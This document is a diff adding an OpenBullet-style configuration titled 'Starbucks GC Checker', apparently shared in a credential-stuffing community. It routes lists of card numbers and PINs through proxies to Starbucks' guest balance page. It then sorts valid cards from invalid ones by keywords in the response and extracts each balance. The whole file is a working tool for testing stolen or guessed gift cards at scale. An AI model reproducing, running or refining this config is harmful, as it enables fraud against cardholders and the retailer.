@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Starbucks GC Checker [by sick of love songs]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-11T19:56:37.3405523+02:00",
+  "AdditionalInfo": "DISCORD : Limited#0690",
+  "Author": "Limited",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.starbucks.com/card/guestbalance" 
+  CONTENT "Card.Number=<USER>&Card.Pin=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.starbucks.com" 
+  HEADER "referer: https://www.starbucks.com/card" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "x-newrelic-id: VQUHVlNSARACV1JSBAIGVA==" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "something has gone wrong" 
+  KEYCHAIN Success OR 
+    KEY "Reload This Card" 
+
+PARSE "<SOURCE>" LR "fetch_balance_value\">" "</span></h2>" -> CAP "" "Balance: " "" 
+
